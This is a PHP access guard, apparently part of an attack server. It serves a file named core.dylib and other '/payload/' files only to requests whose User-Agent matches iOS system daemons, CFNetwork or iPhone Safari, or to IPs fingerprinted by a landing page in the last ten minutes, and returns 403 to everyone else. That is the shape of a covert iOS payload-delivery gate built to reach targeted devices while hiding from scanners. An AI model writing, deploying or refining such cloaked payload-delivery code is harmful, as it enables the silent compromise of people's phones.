<?php
/** guard.php - /core.dylib /payload/ 访问守卫（P0-2，agent1 复审修正版）
 * 判定：UA(扩展正则) OR 指纹窗口(gooll.html 10min) → readfile；否则 403
 * 路径映射：/core.dylib → sync/core_a5.dylib；/payload/<f> → sync/<f>
 */
if (strpos($_SERVER['REQUEST_URI'], '..') !== false) { http_response_code(403); exit; }

$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$ip  = $_SERVER['REMOTE_ADDR'];

// 路径映射
$real = null;
if ($uri === '/core.dylib') {
    $real = '/www/wwwroot/i.131422.com/sync/core_a5.dylib';
} elseif (preg_match('#^/payload/([A-Za-z0-9_.\-]+)$#', $uri, $m)) {
    $p = '/www/wwwroot/i.131422.com/sync/' . $m[1];
    if (is_file($p)) { $real = $p; }
}
if (!$real || !is_file($real)) { http_response_code(404); exit; }

// UA 判断（扩展：daemon 四连 OR CFNetwork/Darwin iOS native OR iPhone Safari 降级链）
$pass = false;
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (preg_match('/(locationd|powerd|configd|imagent)\/\d.*CFNetwork|CFNetwork\/\d.*Darwin\/\d|iPhone.*Safari|\/iPhone/i', $ua)) {
    $pass = true;
}
// 指纹窗口（与 corefile.php/gooll_fp.php 一致）
if (!$pass) {
    $fp = '/tmp/pl_cf_fp/' . md5($ip);
    if (is_file($fp) && (filemtime($fp) > time() - 600)) { $pass = true; }
}
if (!$pass) { http_response_code(403); exit; }

header('Cache-Control: no-store, no-cache, must-revalidate');
header('Content-Type: application/octet-stream');
readfile($real);
